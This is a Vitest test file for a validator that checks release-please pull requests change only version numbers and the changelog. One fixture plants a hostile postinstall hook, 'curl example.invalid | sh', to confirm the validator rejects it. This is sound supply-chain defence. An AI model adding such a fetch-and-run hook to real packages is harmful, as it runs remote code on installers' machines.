import { describe, expect, it } from "vitest";
import { RELEASE_PR_FILES, validateReleaseContents } from "../scripts/validate-release-pr.mjs";

function fixture() {
  const baseFiles: Record<string, string> = {
    "package.json": JSON.stringify({ name: "calandria", version: "1.2.2", scripts: { test: "vitest" } }),
    "desktop/package.json": JSON.stringify({ name: "calandria-desktop", version: "1.2.2", private: true }),
    "package-lock.json": JSON.stringify({ name: "calandria", version: "1.2.2", packages: { "": { name: "calandria", version: "1.2.2", dependencies: { react: "19" } } } }),
    ".release-please-manifest.json": JSON.stringify({ ".": "1.2.2" }),
    "CHANGELOG.md": "# Changelog\n\n## [1.2.2]\n",
  };
  const headFiles: Record<string, string> = Object.fromEntries(Object.entries(baseFiles).map(([file, contents]) => [file, contents.replaceAll("1.2.2", "1.2.3")]));
  return { changedFiles: RELEASE_PR_FILES, baseFiles, headFiles };
}

describe("release-please PR validation", () => {
  it("accepts only the generated version and changelog changes", () => {
    expect(validateReleaseContents(fixture())).toBe("1.2.3");
  });

  it("rejects an extra changed file", () => {
    const value = fixture();
    value.changedFiles = [...value.changedFiles, "scripts/postinstall.mjs"];
    expect(() => validateReleaseContents(value)).toThrow(/must change exactly/);
  });

  it("rejects executable package changes hidden beside the version bump", () => {
    const value = fixture();
    const pkg = JSON.parse(value.headFiles["package.json"]);
    pkg.scripts.postinstall = "curl example.invalid | sh";
    value.headFiles["package.json"] = JSON.stringify(pkg);
    expect(() => validateReleaseContents(value)).toThrow(/fields outside/);
  });

  it("rejects lockfile dependency changes and version drift", () => {
    const dependency = fixture();
    const lock = JSON.parse(dependency.headFiles["package-lock.json"]);
    lock.packages[""].dependencies.react = "20";
    dependency.headFiles["package-lock.json"] = JSON.stringify(lock);
    expect(() => validateReleaseContents(dependency)).toThrow(/fields outside/);

    const drift = fixture();
    const desktop = JSON.parse(drift.headFiles["desktop/package.json"]);
    desktop.version = "1.2.4";
    drift.headFiles["desktop/package.json"] = JSON.stringify(desktop);
    expect(() => validateReleaseContents(drift)).toThrow(/versions must agree/);
  });
});
